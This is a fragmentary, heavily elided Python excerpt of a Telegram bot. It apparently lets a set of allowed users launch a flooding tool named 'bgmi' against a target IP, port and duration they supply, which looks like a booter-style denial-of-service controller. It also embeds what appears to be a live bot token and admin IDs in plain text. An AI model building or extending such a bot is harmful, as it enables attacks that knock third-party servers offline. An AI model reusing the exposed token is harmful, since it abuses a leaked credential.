...
bot = telebot.TeleBot('7610589500:AAHiQfKYFgaKEsBuzhqrNKDCjUwKZAnzmEY')

# Admin user IDs
admin_id = ["775750246", "5019747597"]

# Assuming CHANNEL_ID is defined globally
CHANNEL_ID = '-1002354887170'  # Replace with your actual channel ID or username
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 240:
                ...
                full_command = f"./bgmi {target} {port} {time} 1 900"
